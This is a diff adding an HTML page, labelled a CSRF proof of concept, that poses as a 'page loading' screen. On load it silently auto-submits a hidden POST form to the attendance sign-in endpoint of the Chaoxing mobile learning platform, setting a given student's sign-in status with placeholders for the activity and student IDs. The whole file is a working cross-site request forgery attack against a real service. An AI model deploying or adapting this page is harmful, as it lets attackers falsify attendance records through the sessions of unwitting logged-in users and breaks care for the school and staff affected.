@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head><title>页面加载中...</title></head>
+<body>
+<!-- CSRF PoC: POST方式修改签到状态 -->
+<form id="csrf" method="POST" action="https://mobilelearn.chaoxing.com/pptSign/updateSignStatusByUidsV2?DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=activeId&activeId={ACTIVE_ID}">
+    <input type="hidden" name="uids" value="{STUDENT_UID}" />
+    <input type="hidden" name="status" value="1" />
+    <input type="hidden" name="remark" value="" />
+</form>
+<script>document.getElementById('csrf').submit();</script>
+</body>
+</html>
